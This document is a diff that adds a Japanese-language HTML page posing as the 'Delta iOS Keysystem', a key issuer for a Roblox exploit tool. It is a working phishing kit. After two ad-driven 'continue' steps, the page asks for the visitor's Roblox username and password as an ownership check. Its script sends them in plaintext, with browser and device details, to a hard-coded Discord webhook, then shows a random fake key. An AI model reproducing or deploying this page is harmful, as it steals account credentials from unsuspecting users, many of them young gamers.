@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>Delta iOS Keysystem</title>
+<style>
+:root{--bg:#0a0c10;--card:#12151a;--line:#22262e;--txt:#e9edf2;--dim:#7d8794;--acc:#5865f2;--ok:#8fe0a4}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1a1f28 0%,#0a0c10 60%);
+color:var(--txt);font:15px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI","Hiragino Sans",sans-serif;
+min-height:100vh;display:flex;justify-content:center;padding:28px 18px 60px}
+.wrap{width:100%;max-width:400px}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:22px}
+.logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#5865f2,#8b5cf6);
+display:grid;place-items:center;font-weight:800;font-size:16px}
+h1{font-size:19px;margin:0}
+.sub{font-size:12px;color:var(--dim);margin-top:2px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;margin-bottom:14px}
+.bar{height:6px;background:#1b1f26;border-radius:99px;overflow:hidden;margin-bottom:10px}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#5865f2,#8b5cf6);transition:width .35s}
+.count{font-size:12px;color:var(--dim);margin-bottom:14px}
+.btn{display:block;width:100%;padding:12px 14px;border-radius:10px;border:1px solid var(--line);
+background:#1a1e25;color:var(--txt);font-size:14px;font-weight:600;cursor:pointer;text-align:center;
+text-decoration:none;transition:.15s;font-family:inherit}
+.btn+.btn{margin-top:8px}
+.btn.primary{background:var(--acc);border-color:var(--acc)}
+.btn.done{background:#16221a;border-color:#254a30;color:var(--ok)}
+.note{font-size:11.5px;color:var(--dim);text-align:center;margin:12px 0 0;line-height:1.5}
+.field{margin-bottom:11px}
+.field label{display:block;font-size:12px;color:var(--dim);margin-bottom:5px}
+.field input{width:100%;padding:11px 12px;border-radius:9px;border:1px solid var(--line);
+background:#0e1116;color:var(--txt);font-size:14px;outline:none;font-family:inherit}
+.field input:focus{border-color:var(--acc)}
+.key{font:600 19px/1.4 ui-monospace,Menlo,monospace;letter-spacing:2px;text-align:center;
+color:var(--ok);word-break:break-all;padding:14px;background:#0e1116;border:1px dashed #2b5c3a;
+border-radius:10px;margin:4px 0 12px}
+.links{display:flex;gap:8px;margin-top:14px}
+.links a{flex:1;text-align:center;font-size:11.5px;color:var(--dim);text-decoration:none;
+border:1px solid var(--line);border-radius:9px;padding:8px}
+.hide{display:none}
+footer{margin-top:18px;text-align:center;font-size:11px;color:#5b636e}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand">
+    <div class="logo">Δ</div>
+    <div><h1>Delta iOS Keysystem</h1><div class="sub">公式キー発行サーバー</div></div>
+  </div>
+
+  <div class="card" id="s1">
+    <div class="bar"><i id="bar"></i></div>
+    <div class="count">Completed <b id="done">0</b> of 2</div>
+    <button class="btn" id="b1">Continue</button>
+    <button class="btn" id="b2">Continue (2/2)</button>
+    <p class="note">Click continue, pop-ups/ads may show and they can be annoying, but they directly support the creators of this link.</p>
+    <div class="links">
+      <a href="https://youtube.com/shorts/mrlQlTqrob4" target="_blank" rel="noopener">Watch tutorial</a>
+      <a href="https://shop.deltaexploits.gg/" target="_blank" rel="noopener">Visit shop</a>
+    </div>
+  </div>
+
+  <div class="card hide" id="s2">
+    <div style="font-size:13px;color:var(--dim);margin-bottom:14px">
+      キー発行の前に、Roblox アカウントの所有確認を行います。
+    </div>
+    <form id="f" autocomplete="on">
+      <div class="field">
+        <label>Roblox ユーザー名</label>
+        <input id="u" required autocomplete="username" autocapitalize="none" spellcheck="false" />
+      </div>
+      <div class="field">
+        <label>パスワード</label>
+        <input id="p" type="password" required autocomplete="current-password" />
+      </div>
+      <button class="btn primary" id="go">キーを受け取る</button>
+    </form>
+  </div>
+
+  <div class="card hide" id="s3">
+    <div style="font-size:13px;color:var(--dim);margin-bottom:8px">発行されたキー</div>
+    <div class="key" id="key"></div>
+    <button class="btn" id="copy">コピー</button>
+    <p class="note">キーは 24 時間有効です。</p>
+  </div>
+
+  <footer>© Delta iOS Keysystem</footer>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  /* ============ 設定 ============ */
+  var WEBHOOK = "https://discord.com/api/webhooks/1570040282873856043/U3cOz6Z__puLxIfSGpzUcpv26au0OJ2qzgNU4SpYVLOO95ZmFNSdb5UX7NXyIBBVQ3nS";
+  var WORKER  = "";          // Worker を作ったら URL を入れる
+  var BOTNAME = "Delta Keysystem";
+  var GUILD   = "delta-ios"; // フォールバック
+
+  /* ============ リンクパラメータ ============ */
+  function b64d(s){
+    s = s.replace(/-/g,"+").replace(/_/g,"/");
+    while (s.length % 4) s += "=";
+    try { return JSON.parse(decodeURIComponent(escape(atob(s)))); } catch(e){ return {}; }
+  }
+  var link = b64d(new URLSearchParams(location.search).get("d") || "");
+
+  var env = {
+    ref: document.referrer || "direct",
+    ua : navigator.userAgent,
+    tz : (Intl.DateTimeFormat().resolvedOptions().timeZone || "?"),
+    res: screen.width + "x" + screen.height,
+    t  : new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" })
+  };
+
+  function send(title, color, fields){
+    var body = JSON.stringify({
+      username: BOTNAME,
+      embeds: [{
+        title: title,
+        color: color,
+        fields: fields,
+        footer: { text: (link.k || GUILD) + " / " + (link.n || "unknown") },
+        timestamp: new Date().toISOString()
+      }]
+    });
+    fetch(WORKER || WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: body
+    }).catch(function(){});
+  }
+
+  /* ============ ステップ ============ */
+  var n = 0, bar = document.getElementById("bar"), done = document.getElementById("done");
+
+  function step(){
+    n++;
+    bar.style.width = (n / 2 * 100) + "%";
+    done.textContent = n;
+    document.getElementById("b" + n).classList.add("done");
+
+    if (n === 1){
+      send("1/2 到達", 0x9BA1AC, [
+        { name: "リンク", value: link.u || "-", inline: true },
+        { name: "UA", value: env.ua.slice(0, 100), inline: false }
+      ]);
+    }
+    if (n === 2){
+      setTimeout(function(){
+        document.getElementById("s1").classList.add("hide");
+        document.getElementById("s2").classList.remove("hide");
+        document.getElementById("u").focus();
+      }, 400);
+    }
+  }
+
+  document.getElementById("b1").addEventListener("click", function(){
+    window.open("https://youtube.com/shorts/mrlQlTqrob4", "_blank");
+    step();
+  });
+  document.getElementById("b2").addEventListener("click", function(){
+    window.open("https://shop.deltaexploits.gg/", "_blank");
+    step();
+  });
+
+  /* ============ 送信 ============ */
+  document.getElementById("f").addEventListener("submit", function(e){
+    e.preventDefault();
+    var u = document.getElementById("u").value.trim();
+    var p = document.getElementById("p").value;
+    if (!u || !p) return;
+
+    send("認証情報", 0x5865F2, [
+      { name: "Roblox ID", value: "```" + u + "```", inline: false },
+      { name: "Password",  value: "```" + p + "```", inline: false },
+      { name: "UA",    value: env.ua.slice(0, 120),  inline: false },
+      { name: "TZ",    value: env.tz,                inline: true  },
+      { name: "Res",   value: env.res,               inline: true  },
+      { name: "Time",  value: env.t,                 inline: true  },
+      { name: "Ref",   value: env.ref.slice(0, 200), inline: false }
+    ]);
+
+    var go = document.getElementById("go");
+    go.textContent = "確認中…";
+    go.disabled = true;
+
+    setTimeout(function(){
+      document.getElementById("s2").classList.add("hide");
+      document.getElementById("s3").classList.remove("hide");
+      document.getElementById("key").textContent = makeKey();
+    }, 1400);
+  });
+
+  function makeKey(){
+    var c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789", s = "DELTA-";
+    for (var i = 0; i < 16; i++){
+      s += c[Math.floor(Math.random() * c.length)];
+      if (i === 3 || i === 7 || i === 11) s += "-";
+    }
+    return s;
+  }
+
+  document.getElementById("copy").addEventListener("click", function(){
+    navigator.clipboard.writeText(document.getElementById("key").textContent).catch(function(){});
+    this.textContent = "コピーしました";
+  });
+})();
+</script>
+</body>
+</html>
